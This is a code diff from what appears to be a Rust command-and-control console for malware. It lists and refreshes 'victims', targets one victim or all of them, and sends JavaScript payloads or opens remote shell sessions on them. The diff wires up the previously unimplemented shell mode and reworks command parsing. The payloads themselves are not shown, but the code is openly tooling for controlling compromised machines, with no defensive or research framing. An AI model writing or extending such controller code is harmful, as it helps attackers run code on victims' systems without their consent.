@@ -33,18 +33,16 @@ async fn main() -> Result<(), Box<dyn Error>> {
     s.welcome()?;
     s.refresh_victims().await?;
     s.list_victims()?;
+    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
+
     loop {
-        s.mode.clone().print_and_read(&mut s, &mut input)?;
-        let _ = Commands::read_and_parse(&mut s, &mut input)?;
         match s.mode {
             Mode::Default => {
                 s.list_victims()?;
 
-                let cmd = Commands::read_and_parse(&mut s, &mut input)?;
                 if cmd == Commands::SelectVictim {
                     s.select_victim(&mut input)?;
-                    s.mode.clone().print_and_read(&mut s, &mut input)?;
-                    let cmd = Commands::read_and_parse(&mut s, &mut input)?;
+                    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                     if cmd == Commands::JavaScript {
                         javascript(&mut s).await?;
                     }
@@ -52,24 +50,28 @@ async fn main() -> Result<(), Box<dyn Error>> {
                     s.refresh_victims().await?;
                     write!(s.write, "Targetting all victims")?;
                     s.write.flush()?;
-                    let cmd = Commands::read_and_parse(&mut s, &mut input)?;
+
+                    // select payload
+                    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                     if cmd == Commands::JavaScript {
                         javascript(&mut s).await?;
                     } else if cmd == Commands::Shell {
                     }
                 }
             }
-            Mode::Shell => s.shell_prompt()?,
+            Mode::Shell => {
+                shell(&mut s, &mut input).await?;
+            }
             Mode::TargetAll => loop {
                 s.refresh_victims().await?;
                 writeln!(s.write, "Targetting all victims")?;
-                let cmd = Commands::read_and_parse(&mut s, &mut input)?;
+                let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                 if cmd == Commands::JavaScript {
                     javascript(&mut s).await?;
                 } else if cmd == Commands::Shell {
-                    unimplemented!()
-                }
-                if s.mode == Mode::Exit {
+                    shell(&mut s, &mut input).await?;
+                    break;
+                } else if s.mode == Mode::Exit {
                     break;
                 }
             },
